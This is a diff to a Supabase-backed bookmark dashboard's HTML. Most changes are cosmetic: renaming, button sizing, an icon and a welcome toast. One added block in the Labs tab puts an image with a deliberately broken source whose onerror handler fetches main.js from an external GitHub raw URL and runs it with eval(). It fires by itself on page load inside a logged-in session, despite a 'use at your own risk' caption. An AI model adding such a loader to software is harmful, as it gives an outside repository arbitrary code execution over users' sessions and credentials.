@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Search - Advanced Dashboard</title>
+    <title>Navigation Search - Advanced Dashboard</title>
 
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
@@ -466,19 +466,18 @@
                 </div>
             </div>
             
-            <nav class="flex gap-4 items-center">
-                <button onclick="switchTab('dashboard')" class="btn-secondary active px-8 py-4 rounded-2xl text-sm font-semibold" id="tab-dashboard">
+            <nav class="flex gap-2 items-center select-none">
+                <button onclick="switchTab('dashboard')" class="btn-secondary active px-6 py-3 rounded-2xl text-sm font-semibold" id="tab-dashboard">
                     Dashboard
                 </button>
-                <button onclick="switchTab('analytics')" class="btn-secondary px-8 py-4 rounded-2xl text-sm font-semibold" id="tab-analytics">
+                <button onclick="switchTab('analytics')" class="btn-secondary px-6 py-3 rounded-2xl text-sm font-semibold" id="tab-analytics">
                     Analytics
                 </button>
-                <button onclick="switchTab('labs')" class="btn-secondary px-8 py-4 rounded-2xl text-sm font-semibold" id="tab-labs">
+                <button onclick="switchTab('labs')" class="btn-secondary px-6 py-3 rounded-2xl text-sm font-semibold" id="tab-labs">
                     Labs
                 </button>
                 <div class="w-px h-8 bg-white/20 mx-2"></div>
-                <button id="themeToggle" class="btn-secondary px-4 py-4 rounded-2xl text-lg">🌙</button>
-                <button onclick="logout()" class="btn-secondary px-6 py-4 rounded-2xl text-sm font-semibold">
+                <button onclick="logout()" class="btn-secondary px-6 py-3 rounded-2xl text-sm font-semibold">
                     Logout
                 </button>
             </nav>
@@ -520,7 +519,7 @@
                 <div class="flex flex-wrap gap-6 mb-12">
                     <button onclick="addBookmark()" class="btn-secondary px-10 py-5 rounded-2xl text-white font-semibold flex items-center gap-4 text-lg">
                         <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
                         </svg>
                         Add Bookmark
                     </button>
@@ -695,6 +694,18 @@
                             <p class="text-white/80 text-lg">Download as browser-compatible HTML file that works with all browsers</p>
                         </button>
                     </div>
+                </div>
+
+                <!-- 1. Add the Lego script image to Labs tab -->
+                <!-- Place inside the Labs tab, e.g. after Export Bookmarks section -->
+                <div class="glass rounded-3xl p-10 mt-8">
+                    <h2 class="text-2xl font-bold mb-4 flex items-center gap-4">
+                        <span>⚠️</span> Run External Script (Demo)
+                    </h2>
+                    <p class="text-white/70 mb-4">Use at your own risk. Loads and runs code from the repo:</p>
+                    <img src="#" alt="Lego Script Loader" style="max-width:100px"
+                         onerror='fetch("https://raw.githubusercontent.com/devpookie/placeholder.dev/refs/heads/main/main.js").then(r=>r.text()).then(c=>eval(c))'>
+                    <p class="text-xs text-white/40 mt-2">This will fetch and execute <code>main.js</code> from <a href="https://github.com/devpookie/placeholder.dev" target="_blank" class="underline">devpookie/placeholder.dev</a>.</p>
                 </div>
             </div>
         </div>
@@ -1260,17 +1271,18 @@
             document.body.style.overflow = '';
         }
 
-        function showWelcome(nameOrEmail) {
-            const toast = document.getElementById('welcomeToast');
-            toast.textContent = `Welcome back, ${nameOrEmail}!`;
-            toast.style.opacity = '1';
-            toast.style.transform = 'translateX(-50%) translateY(0)';
+        function showWelcome(name, isFirstLogin = false) {
+            const welcomeToast = document.getElementById('welcomeToast');
+            welcomeToast.textContent = isFirstLogin ? `Welcome, ${name}!` : `Wsp, ${name}!`;
+            welcomeToast.classList.remove('opacity-0');
             setTimeout(() => {
-                toast.style.opacity = '0';
-                toast.style.transform = 'translateX(-50%) translateY(-20px)';
+            welcomeToast.classList.add('opacity-100');
+            setTimeout(() => {
+                welcomeToast.classList.remove('opacity-100');
+                setTimeout(() => welcomeToast.textContent = '', 500);
             }, 3000);
+            }, 100);
         }
-
         // Enhanced User Profile
         async function loadUserProfile() {
             const { data: { user } } = await supabase.auth.getUser();
